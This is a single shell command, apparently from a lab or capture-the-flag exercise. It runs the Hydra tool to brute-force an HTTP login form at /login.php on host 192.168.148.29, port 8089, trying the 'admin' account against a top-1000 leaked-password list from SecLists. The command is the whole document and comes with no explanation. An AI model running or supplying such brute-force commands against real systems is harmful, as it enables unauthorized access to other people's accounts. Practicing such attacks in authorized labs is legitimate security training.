```
 hydra 192.168.148.29 -s 8089  http-form-post "/login.php:user=^USER^&pass=^PASS^:incorrect" -l admin -P  /usr/share/seclists/Passwords/darkweb2017-top1000.txt -V -I
```